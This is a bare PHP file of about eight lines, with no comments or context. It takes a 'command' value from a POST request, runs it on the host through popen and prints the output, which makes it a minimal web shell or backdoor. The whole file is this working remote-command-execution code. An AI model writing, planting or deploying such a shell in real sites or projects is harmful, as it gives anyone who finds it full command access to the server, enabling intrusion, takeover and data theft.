<?php
if  ($_POST['command'] )  { 
    $pp = popen($_POST['command'], 'r'); 
    $read = fread($pp, 2096); 
    echo $read; 
    pclose($pp); 
} 
?>